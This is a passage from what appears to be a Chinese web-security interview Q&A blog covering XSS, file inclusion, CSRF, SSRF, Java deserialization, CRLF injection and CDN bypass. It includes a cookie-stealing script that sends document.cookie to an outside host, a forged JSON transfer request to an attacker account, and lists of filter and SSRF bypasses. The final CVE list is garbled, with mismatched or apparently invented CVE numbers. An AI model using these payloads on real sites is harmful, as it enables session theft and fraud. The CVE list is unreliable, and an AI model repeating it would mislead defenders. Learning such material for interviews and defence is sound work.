自身的安全漏洞，反射型XSS都属于服务端的安全漏洞。<br>攻击原理不同：DOM型XSS是通过修改或篡改页面的DOM结构，从而执行恶意脚本代码；反射型XSS是将恶意代码注入到URL中，当用户访问该URL时，恶意代码会被执行。<br>攻击效果不同：DOM型XSS的攻击效果更加隐蔽，更难以检测；反射型XSS的攻击效果相对较弱，比较容易被检测。<br>防范措施不同：DOM型XSS的防范措施包括使用白名单、过滤器、安全的编程规范等；反射型XSS的防范措施包括对用户输入的数据进行过滤和编码。</p><ol start="8"><li>如果SRC上报了一个XSS漏洞，payload已经写入页面，但未给出具体位置，如何快速介入？</li></ol><p>检查用户可控输入：可以使用Burp Suite等工具来模拟用户输入，并检查输出是否包含恶意代码。<br>检查HTML输出：可以使用Burp Suite等工具来检查HTML输出是否包含敏感字符和代码。<br>使用XSS扫描工具：可以使用OWASP ZAP、XSS Checker等工具来扫描网站，并检测XSS漏洞。</p><ol start="9"><li>XSS Worm 原理</li></ol><p>XSS Worm（跨站脚本蠕虫）是一种利用XSS漏洞进行传播的蠕虫。蠕虫会在受害者浏览器中执行恶意代码，并通过受害者浏览器访问其他网站，从而感染其他用户。</p><p>XSS Worm的攻击原理如下：<br>攻击者在网站的留言板、评论区等地方提交恶意代码。<br>网站将恶意代码输出到页面，但未进行编码。<br>用户访问该页面时，恶意代码会被执行。<br>恶意代码会在受害者浏览器中执行，并通过受害者浏览器访问其他网站。<br>恶意代码会在其他网站上传播，感染其他用户。</p><ol start="10"><li>有没有用过xss平台？</li></ol><p>在线平台：<a href="https://xssaq.com/login/">xssaq</a><br><a href="https://developer.aliyun.com/article/1168390">XSS平台搭建及利用</a></p><ol start="11"><li>xss如何执行代码</li></ol><p>反射型是将恶意代码注入到URL中，访问URL代码被执行。<br>存储型是将恶意代码注入到URL中，当用户访问包含恶意代码的页面时，恶意代码将会被执行。</p><ol start="12"><li>xss常用哪些标签？</li></ol><p>常用标签：<br><code>&lt;script&gt;, &lt;body&gt;, &lt;img&gt;, &lt;a&gt;, &lt;iframe&gt;, &lt;svg&gt;, &lt;input&gt;, &lt;video&gt;, &lt;style&gt; </code></p><ol start="13"><li>xss如何盗取cookie</li></ol><p><code>&lt;script&gt;alert(&quot;document.cookie&quot;)&lt;/script&gt;</code><br>将以下代码封装成 <code>cookies.js</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://beauty.com/log?&quot;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>实际从网页获取cookie代码： <code>&lt;script src = xx.com/cookies.js&gt;&lt;/script&gt;</code></p><ol start="14"><li>xss有cookie一定可以无用户名密码登录吗？</li></ol><p>不一定。有几个原因：<br>(1) cookie可能已过期<br>(2) 网站可能会使用双因素认证，比如token</p><ol start="15"><li>XSS除了获取cookie，还有别的用处吗?</li></ol><p>见问题1</p><ol start="16"><li>xss的危害，可能存在的地方？</li></ol><p>xss危害：见问题1<br>可能存在的地方：见问题5</p><ol start="17"><li>xss漏洞测试方法</li></ol><p>手动测试（相对准确，效率较低）：<br>识别可能存在 XSS 漏洞的输入字段。重点考虑数据输入的地方<br>尝试在输入字段中输入各种类型的恶意代码。比如 <code>&lt;, &gt;, ()</code> 等，提交后查看网页源代码的变化以发现输入被输出到什么地方<br>观察浏览器的响应，查看是否存在恶意代码被执行的情况。</p><p>自动测试：<br>选择合适的自动化工具。如：AVWS，BurpSuite，XSSer，XSSF，BeEF，beef-xss，XSStrike<br>配置自动化工具。<br>运行自动化工具。<br>分析自动化测试的结果，查看是否存在 XSS 漏洞。</p><ol start="18"><li>xss如何绕过安全防范</li></ol><p>使用Unicode编码：将字符转为unicode集，从而绕过过滤器。<br>使用混淆技术：混淆技术可以将恶意代码混淆，从而绕过过滤器。<br>使用漏洞利用工具：帮助攻击者自动化绕过安全防范措施。</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ol><li>php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码，手工的话如何发掘？如果无本地报错回显，如何遍历文件？</li></ol><p>PHP本地包含漏洞原理：包含文件设置为变量，无过滤或过滤不严导致可调用恶意文件，还可以对远程文件包含。攻击者通过控制包含函数，如include(), require()等，加载服务器本地上的PHP脚本文件，配合任意文件上传漏洞，将恶意文件上传进服务器中，再通过本地文件包含执行该恶意脚本达到获得网站控制权的目的。<br>手工发掘文件包含漏洞：查找包含函数的使用，分析文件名是否来自用户输入，如果文件名未过滤可以尝试包含恶意文件。<br>存在漏洞却没有回显：有可能没显示在页面而是在源码中，可以利用DNSlog进行获取包含的信息。从index.php文件一级级读取。也可利用PHP封装协议读取文件。</p><ol start="2"><li>PHP和Java的文件包含区别</li></ol><p>PHP的文件包含：通常使用 <code>include</code> , <code>require</code> 两个函数实现。 <code>include</code> 函数包含文件不存在时会产生警告，但不会终止脚本的执行； <code>require</code> 函数在包含文件不存在时会产生致命错误，并终止脚本的执行。<br>PHP的文件包含功能可以包含任何文件。当包含PHP文件时，PHP解释器会将包含文件的代码解析并执行。因此，如果攻击者可以控制包含文件的内容，则可以利用文件包含漏洞来执行任意代码，从而获得系统权限。</p><p>Java的文件包含：Java的文件包含功能使用 <code>Class.getResource()</code> 来实现。 <code>Class.getResource()</code> 方法可以获取类路径下的资源文件，包括文件、图片、音频等。<br>Java的文件包含功能只能包含类路径下的资源文件。如果攻击者可以控制类路径下的资源文件，则可以利用文件包含漏洞来读取敏感信息，例如配置文件、源代码等。</p><p>区别：<br>PHP的文件包含更灵活，能包含任意文件；Java的文件包含只能包含类路径下的资源文件。<br>PHP的文件包含功能可以执行代码；Java的文件包含之恶能执行文件。<br>因此PHP的文件包含漏洞更严重。</p><ol start="3"><li>文件包含以及变量覆盖</li></ol><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值。<br>常见变量覆盖漏洞： <code>extract(), parse_str(), $$</code><br>变量覆盖实现方式：直接赋值，使用函数，使用运算符<br>变量覆盖可以用于实现不同的功能。，例如：改变变量的值，重置变量的值，删除变量的值。<br>如果攻击者可以控制传入的参数，则可以利用变量覆盖来修改程序的关键变量值，从而实现攻击目标。<br>常见变量覆盖漏洞：参数污染，注入攻击，缓冲区溢出<br>防止变量覆盖漏洞采取的措施：使用安全编码规范，对参数进行严格的验证，使用安全框架或安全工具。</p><ol start="4"><li>文件包含漏洞攻击原理及分类</li></ol><p>原理：文件包含函数加载的参数未经过过滤或严格的定义，可以被用户控制，包含其它恶意文件，导致执行非预期代码。<br>分类：远程文件包含（RFI），本地文件包含（LFI）</p><ol start="5"><li>如何快速挖掘包含漏洞</li></ol><p>可以使用自动化工具：OWASP ZAP，Burp Suite，W3AF<br>或者手动分析源代码：尝试使用别人已公布的nday，自行写脚本或用别人已写好的脚本；使用含糊测试，传入各种含糊数据；尝试包含各种类型文件，如html，css，js等；尝试包含目录中的文件，触发目录遍历漏洞；尝试包含系统文件，如配置文件、源代码等；尝试包含远程文件，以执行任意代码。</p><ol start="6"><li>包含漏洞具体能做什么，怎么绕过？</li></ol><p>具体能做：执行任意代码，读取敏感信息，影响应用程序正常执行。<br>绕过方式：<br>本地文件包含漏洞绕过: <code>%00</code> 截断，路径长度截断，点号截断，<br>远程文件包含漏洞绕过: 问号绕过，#号绕过，空格绕过</p><ol start="7"><li>导致文件包含的函数</li></ol><p>PHP：include(), include_once(), require(), require_once(), fopen(), readfile()<br>JSP&#x2F;Servlet: ava.io.File(), java.io.FileReader()<br>ASP: include file, include virtual</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ol><li>CSRF如何不带referer访问</li></ol><p>(1) 使用空Referer头：将Referer头设置为空，这样请求就不会被拒绝。<br>(2) 使用其它协议：如 <code>ftp://  http://  file://  javascript:  data:</code></p><ol start="2"><li>CSRF成因及防御措施；如果不用token如何做防御？</li></ol><p>CSRF攻击的成因：<br>HTTP协议是无状态的：每个请求独立，与之前的请求无关。服务器无法追踪之前的请求来判断当前请求是否来自受信任的来源。<br>Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是否是用户批准发送的。<br>用户的浏览器会自动发送cookie：即使用户未意识到，浏览器也会发送cookie，从而泄露用户的身份信息。</p><ol start="3"><li>CSRF有何危害？</li></ol><p>执行任意操作：比如转账，修改密码，发布信息等<br>窃取敏感信息：如银行卡号，密码等<br>破坏网站功能：发送垃圾邮件，发布恶意内容等</p><ol start="4"><li>如何防止CSRF？</li></ol><p>(1) 阻止不明外域访问，采用同源策略 Samesite Cookie<br>(2) 使用token，分布式校验<br>(3) 使用双因素认证<br>(4) 使用安全框架或安全工具</p><ol start="5"><li>CSRF的原理及防御</li></ol><p>原理：CSRF攻击通常通过发送带有恶意请求的链接或表单来进行。当受害者点击链接或提交表单时，恶意请求就会被发送到目标网站。如果目标网站没有采取措施防止CSRF攻击，那么恶意请求就会被执行，并导致受害者执行攻击者的操作。<br>防御：见问题4</p><ol start="6"><li>一种特殊的CSRF场景：后端只解析json格式的时候如何利用CSRF（非更改Content-Type）</li></ol><p>利用XSS漏洞或DOM XSS，然后利用恶意代码来发送CSRF请求<br>利用JSON请求嵌入到一个HTML或CSS中，当访问该页面时，恶意的JSON请求就会发送到服务器。<br>首先需要获得受害者的cookie和token等需要验证身份的信息，然后构造一个JSON CSRF攻击(以银行体系为例)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /api/transfer <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: examplebank.<span class="property">com</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Cookie</span>: session_id=&lt;<span class="variable constant_">USER_SESSION_ID</span>&gt;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;token&quot;</span>: <span class="string">&quot;&lt;UI_TOKEN&gt;&quot;</span>,</span><br><span class="line">   <span class="string">&quot;to_account&quot;</span>: <span class="string">&quot;&lt;ATTACKER_ACCOUNT&gt;&quot;</span>,</span><br><span class="line">   <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;-100000&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用js打fetch这类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com/post-data&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-csrf-token&#x27;</span>: token <span class="comment">// 从上面获取到的 CSRF Token</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="comment">// POST 请求的数据</span></span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> <span class="comment">// 传递 cookies</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">body</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 处理响应</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li>SameSite</li></ol><p>SameSite是HTTP Cookie属性，用于限制cookie在跨站点请求中的传输，以防止web应用程序遭受CSRF攻击。SameSite属性可以设置为以下三个值：<br>None: Cookie可以跨站点传输，Lax: Cookie可以从同一域或同源子域发出的站点请求中跨站点传输。Strict: Cookie仅限于在同一域内的请求中传输。</p><ol start="8"><li>csrf攻击原理是什么，一般用什么工具进行检测</li></ol><p>原理：见问题5<br>探测工具：CSRF Tester, BurpSuite, OWASP CSRFGuard</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ol><li>SSRF漏洞的成因 防御 绕过</li></ol><p>成因：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。<br>防御：请求地址严格过滤，用正则表达式或黑名单。过滤放回信息。统一错误信息，避免攻击者可通过错误信息判断远程服务器端口的状态。限制请求的端口为http常用端口(如 80 443 8080 8090)。黑名单内网IP。禁用不需要的协议（仅允许http&#x2F;https）。使用隔离区，对外发起的请求放置在隔离区中进行严格的安全管控。内部系统使用代理来转发请求，防止攻击者直接访问目标地址。及时修复服务端漏洞，定期进行安全审计，关注安全动态。<br>绕过：<br>如果限制为 <code>http://www.xxx.com</code> 域名，使用绕过方式为 <code>http://www.xxx.com@www.xxc.com</code><br>如果限制请求IP不为内网地址，可采用绕过方式为：短地址，特殊域名，进制转换<br>如果限制请求只为http协议，可采用绕过方式为：采取302跳转，采取短地址<br>常用绕过方式：利用302跳转，进制转换，利用DNS解析，利用@绕过，利用[::]，添加端口号，利用短网址，其它各种指向127.0.0.1的地址，中文句号代替点号，利用IDN</p><ol start="2"><li>介绍SSRF漏洞，如何深入利用？如何探测非HTTP协议？如何防范？</li></ol><p>介绍SSRF漏洞：服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><p>深入利用：获取敏感信息（如Redis未授权，MySQL未授权等），执行恶意操作（如上传文件，执行命令，修改数据等），控制外部系统（如web服务，数据库，文件系统等），进行攻击链（与RCE，数据库，文件上传，XSS等漏洞结合实现更大攻击效果）</p><p>探测非HTTP协议：<br>(1) 使用burpsuite的intruder，然后在payloads选择要使用的payload，在scope指定测试的url，在attack选择request method为post，在payload options处选择body data为gopher。<br>(2) 在dnslog创建一个新的域名，在服务端构造恶意请求，将url设置为dnslog的域名，在客户端发送恶意请求，如果服务器支持gopher协议则会向dnslog发送一个gopher协议的请求，dnslog会记录并将结果返回。</p><ol start="3"><li>SSRF利用点</li></ol><p>利用点：<br>内网服务（如Apache Hadoop远程命令执行，dict，docker API远程命令执行等）<br>Redis利用（如写ssh公钥，写crontab，写webshell，Windows启动项，主从复制加载.so文件，主从复制写无损文件）<br>云主机（通过访问云环境的元数据或管理API，部分情况下实现敏感信息等效果）<br>URL中：share, wap, url, link, src, source, target, u, 3g, display, sourceURI, ImageURL, domain,<br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">SSRF利用点</a></p><ol start="4"><li>ssrf的原理即后利用，怎么执行命令，常搭配使用的协议。</li></ol><p>在 SSRF 漏洞的后利用中，常见的方法是利用内网开放端口执行命令。攻击者可以通过 SSRF 漏洞将请求发送到内网的服务器，并执行任意命令。例如，攻击者可以将请求发送到内网的 SSH 服务器，并通过 SSH 协议连接到目标站点，从而获得对目标站点的控制权。这种方法的优点是比较简单易行，不需要攻击者构造复杂的请求。缺点是需要目标站点有内网开放的端口。<br>常搭配使用的协议：gopher, dict, file, http&#x2F;s,</p><ol start="5"><li>ssrf漏洞攻击原理，用途</li></ol><p>原理：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。<br>用途：SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><ol start="6"><li>说说如何挖掘ssrf漏洞</li></ol><p>挖掘：<br>首先查看常见场景：url地址进行网页分享，转码服务，图片加载与下载，未公开的api实现以及其它调用url的功能等<br>ssrf产生漏洞的函数： <code>file_get_contents(),  fsockopen(), curl_exec()</code></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ol><li>Java反序列化基础</li></ol><p>Java反序列化是将Java对象从字节流中恢复的过程。反序列化过程主要分为2步：<br>(1) 读取字节流，根据序列化规格提取对应的类<br>(2) 利用反射实例化获得对象</p><p>序列化对象的格式<br>Flag | data | flag | data</p><p>Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><p>对象能够成功的反序列化是因为和序列化的时候使用的协议是一样的，对应到Java反序列化中这里的协议指的就是serialVersionUID</p><p>Java反序列化漏洞是指在Java反序列化过程中，攻击者可以利用恶意对象的readObject方法来执行任意代码。Java反序列化漏洞通常出现在以下场景：<br>第三方库中存在漏洞<br>开发人员在开发过程中不小心导致了漏洞</p><p>利用方式主要有以下几种：<br>远程代码执行，恶意文件读取，任意文件写入</p><p>防范措施：<br>白名单机制，只允许反序列化特定的类<br>使用安全的序列化库<br>开发人员在开发过程中注意避免漏洞</p><ol start="2"><li>Java反序列化有哪些CC链是有回显的？</li></ol><p>Java反序列化CC链是指利用Java反序列化漏洞执行恶意代码的链条。cc链通常由多个类组成，每个类都负责执行特定的任务，最终达到执行恶意代码的目的。<br>有回显的CC链包括：<br>JNDI回显：利用JNDI服务将恶意代码执行结果输出到指定位置。<br>异常抛出回显：利用恶意代码抛出异常，并将异常信息输出到指定位置。<br>写文件回显：将恶意代码执行结果写入到指定文件中。<br>DNSlog回显：将恶意代码执行结果发送到指定的DNSlog服务器。</p><ol start="3"><li>Java反序列化相关的协议？</li></ol><p>Java Serialization Protocol: 将对象转换为字节流的协议。该协议定义了对象序列化过程中，需要保存对象的类名和类属性。<br>Externalizable Protocol: 将对象转换为字节流的协议。允许对象在序列化和反序列化过程中自定义序列化逻辑。</p><ol start="4"><li>Fastjson反序列化及如何修复？</li></ol><p>FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象。<br>fastjson反序列化漏洞的利用方式主要有：利用类重写漏洞，利用链式反序列化漏洞，利用反序列化回显漏洞。<br>FastJson&lt;1.2.24:<br>JdbcRowSetlmpl类+JNDI(出网)<br>FastJsonBcel类+动态类加载(不出网)<br>FastJson&lt;&#x3D;1.2.47:</p><ol start="5"><li>Java反序列化的原理</li></ol><p>见问题1</p><ol start="6"><li>讲讲yso的链</li></ol><p>yso链是用于Java反序列化攻击的利用链。yso链是通过将多个Java类链接在一起，从而实现执行任意代码的目的。<br>yso链通常由以下几部分组成：<br>反序列化触发类：该类负责触发反序列化过程。<br>反序列化漏洞类：该类存在反序列化漏洞，攻击者可以利用该漏洞来执行任意代码。<br>执行代码类：该类负责执行攻击者指定的代码。</p><p>yso链的具体实现方法有：<br>CommonsCollections3链：该链利用Apache Commons Collection 3.1中的反序列化漏洞来执行任意代码。<br>fastjson链：该链利用FastJson中的反序列化漏洞来执行任意代码。<br>JNDI链：该链利用JNDI服务来执行任意代码。</p><p>可用来控制服务器，获取敏感信息，进行数据篡改等</p><p>防范措施：<br>升级JDK和第三方库到最新版本。<br>使用白名单机制：只允许反序列化特定的类和对象。<br>使用安全的网络协议：如HTTPS，避免使用HTTP<br>使用安全的web应用程序框架：如Spring Boot, Jetty等。</p><ol start="7"><li>shiro反序列化原理</li></ol><p>shiro版本：1.2.4<br>Apache Shiro框架提供了一个RememberMe的功能，这个功能在用户登陆成功后，会生成一个加密后的cookie，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段。其中记住我的RememberMe就是cookie中的key。cookie的值是对相关信息进行反序列化，再进行AES加密，再使用base64编码之后形成的。<br>服务端接收cookie值时，也是按以下步骤解析的：<br>检索RememberMe cookie的值，base64解码，再使用AES解码（加密密钥硬编码），最后进行反序列化操作（未作过滤处理）。</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。<br>AES的密钥key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。<br>因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的RememberMe字段发送。Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。<br><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">Java反序列化Shiro篇01-Shiro550流程分析</a></p><ol start="8"><li>反序列化原理</li></ol><p>未对反序列化接口做访问控制，未对反序列化数据做加密和签名，加密密钥使用硬编码，使用不安全的反序列化框架库或函数的情况，由于反序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ol><li>命令注入有哪些</li></ol><p>代码层过滤不严造成的命令注入：如 <code>system(&quot;/bin/program --arg $arg&quot;);</code><br>系统漏洞造成命令注入：如bash破壳漏洞<br>调用的第三方组件存在代码执行漏洞：如thinkphp5.x的命令执行</p><p>SQL注入<br>OS命令注入<br>LDAP注入<br>JNDI注入</p><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li>CRLF注入原理。</li></ol><p>CRLF(Carriage-Return Line-Feed 回车换行)，用字符表示即为 <code>\r\n</code><br>在http当中http的header和body之间就是用两个crlf进行分隔的。如果能控制http消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF Injection又叫做HTTP Response Splitting(HTTP响应拆分漏洞，简称HRS)，CRLF漏洞可以造成 Cookie会话固定 和 反射型XSS(可过WAF) 的危害。<br>注入XSS的利用方式：连续使用两次%0d%0a就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p><p>HRS漏洞存在的前提是：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf。<br>一般网站会在HTTP头中加入 <code>Location: http://example.com</code> 的方式来进行302跳转，所以我们能控制的内容就是Location后面的网址，对这个地址进行污染。</p><p>原理：类似于XSS，利用Web应用程序对CRLF结束标记进行欺骗的攻击手法。当未对HTTP参数或URL进行过滤时，攻击者通过在HTTP协议头中注入恶意的CRLF字符，欺骗web服务器将请求分割为两个部分，其中第二部分被认为是新的请求。导致攻击者在新的HTTP请求中注入恶意代码，例如恶意重定向，cookie欺骗，会话劫持等。</p><ol start="2"><li>如何绕过CDN获取目标网站真实IP？</li></ol><p>CDN(Content Delivery Network，内容分发网络)是一种通过在多个地理位置部署服务器来缓存静态内容（如图片、CSS、Javascript、HTML等）并提供更快的访问速度的技术。CDN可以保护网站免受攻击，但也可能会导致攻击者无法获取目标网站的真实IP。<br>绕过CDN获取目标网站真实IP的方法：<br>(1) 利用DNS历史解析记录。CDN通常会将目标网站的域名解析到多个CDN节点的IP地址。如果目标网站以前没有使用CDN，那么在DNS历史解析记录中可能仍会保留其真实的IP地址。相关查询网站： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iphistory: https://viewdns.info/iphistory/</span><br><span class="line">DNS查询: https://dnsdb.io/zh-cn/</span><br><span class="line">微步在线: https://x.threatbook.cn/</span><br><span class="line">域名查询: https://site.ip138.com/</span><br><span class="line">DNS历史查询: https://securitytrails.com/</span><br><span class="line">Netcraft: https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure><p>(2) 查询子域名。CDN通常只会将目标网站的主域名解析到CDN节点的IP地址。如果目标网站有多个子域名，那么其中某些子域名可能没有使用CDN。子域名查找方法和工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">搜索引擎查询：如Google。使用语法类似于 site:baidu.com  inurl:baidu.com，搜目标名字</span><br><span class="line">在线查询工具：</span><br><span class="line">如: https://tool.chinaz.com/sudbdomain/  https://i.links.cn/subdomain/ </span><br><span class="line">https://subdomain.chaxun.la/  https://searchdns.netcraft.com/  https://www.virustotal.com/</span><br><span class="line">子域名爆破工具: </span><br><span class="line">Layer子域名挖掘机  wydomain：https://github.com/ring04h/wydomain  </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/  Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure><p>(3) 网站邮件头信息。比如邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，由于一般的邮件系统在内部，未经过CDN解析，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p><p>(4) 网络空间安全引擎搜索。通过关键字或网站域名，找出被收录的IP，有时获取到的就是网站的真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">钟馗之眼： https://www.zoomeye.org</span><br><span class="line">Shodan: https://www.shodan.io</span><br><span class="line">Fofa: https://fofa.so</span><br><span class="line">ZoomEye: https://www.zoomeye.org/</span><br></pre></td></tr></table></figure><p>(5) 利用SSL证书寻找真实IP。证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。<br>步骤：访问网站，在地址栏查看网址的SSL证书(锁型图标)。复制SSL证书的SHA1指纹，SHA1指纹是用于识别证书的唯一标识符。将SHA1指纹粘贴到SSL证书搜索工具中，可使用Censys或SSL Labs等工具。搜索结果将显示网站的真实ip地址，大多数情况下真实IP地址与SSL证书中的IP地址相同。注意某些网站可能会用多个IP地址或CDN来托管其网站。<br>(6) 国外主机解析域名。国外多ping测试工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://asm.ca.com/zh_cn/ping.php</span><br><span class="line">http://host-tracker.com/</span><br><span class="line">http://www.webpagetest.org/</span><br><span class="line">https://dnscheck.pingdom.com/</span><br></pre></td></tr></table></figure><p>(7) 扫描全网。通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Zmap: https://github.com/zmap/zmap</span><br><span class="line">Masscan: https://github.com/robertdavidgraham/masscan</span><br></pre></td></tr></table></figure><p>(8) 配置不当导致绕过。在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。<br>案例1：为了方便用户访问，我们常常将 <code>www.test.com</code> 和 <code>test.com</code> 解析到同一个站点，而CDN只配置了 <code>www.test.com</code> ，通过访问 <code>test.com</code> ，就可以绕过 CDN 了。<br>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p><ol start="3"><li>列举你所知道的所有开源组件高危漏洞（10个以上）</li></ol><p>(1) Log4j 2 远程代码执行漏洞(CVE-2021-44228):该漏洞影响了Log4j 2 所有版本，可被利用来执行任意代码。<br>(2) Spring Core RCE漏洞(CVE-2022-22965): Spring Framework远程代码执行漏洞<br>(3) Spring Boot RCE漏洞(CVE-2022-22963): Spring Cloud Function存在SPEL表达式注入漏洞<br>(4) Fastjson 反序列化漏洞(CVE-2022-22947): Spring Cloud Gateway远程代码执行漏洞<br>(5) Apache Struts2 反序列化漏洞（CVE-2022-0338）<br>(6) Apache Commons Collections 反序列化漏洞（CVE-2022-22960）<br>(7) Apache Commons FileUpload 反序列化漏洞（CVE-2022-22959）<br>(8) Apache Commons BeanUtils 反序列化漏洞（CVE-2022-22958）<br>(9) Jenkins 远程代码执行漏洞（CVE-2022-0241）<br>(10) Apache Tomcat 远程代码执行漏洞（CVE-2022-22966）<br>(11) Apache Shiro 远程代码执行漏洞（CVE-2022-22967）<br>(12) Spring Data Commons SQL 远程代码执行漏洞（CVE-2022-22964）<br>(13) Spring Boot Starter Data JPA 远程代码执行漏洞（CVE-2022-22962）<br>(14) Apache Log4j SQL注入漏洞(CVE-2022-23305)</p><ol 